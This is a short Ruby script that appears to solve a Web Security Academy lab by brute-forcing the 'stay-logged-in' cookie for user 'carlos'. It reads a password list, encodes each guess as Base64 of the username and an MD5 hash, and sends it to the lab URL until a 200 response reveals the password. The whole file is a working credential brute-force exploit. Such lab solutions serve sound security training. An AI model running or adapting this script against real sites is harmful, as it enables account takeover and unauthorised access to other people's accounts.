require 'http'
require 'Base64'
require 'Digest'


url='https://0abc00600327f949840cd423006d0067.web-security-academy.net/my-account?id=carlos'

fp = File.new "passwd.txt","r"
passwd = fp.readlines
fp.close

#1. Craft cookie Bae64(name:md5(password))
passwd.count.times do |p|
	sleep 1
	cookie = Base64.encode64("carlos:#{Digest::MD5.hexdigest(passwd[p].chomp)}").chomp
	puts cookie
	resp = HTTP.cookies(:"stay-logged-in"=>"#{cookie}").get(url)
	if resp.code==200
		puts "Logged In"
		puts "Password: #{passwd[p].chomp}"
		break
	end
end
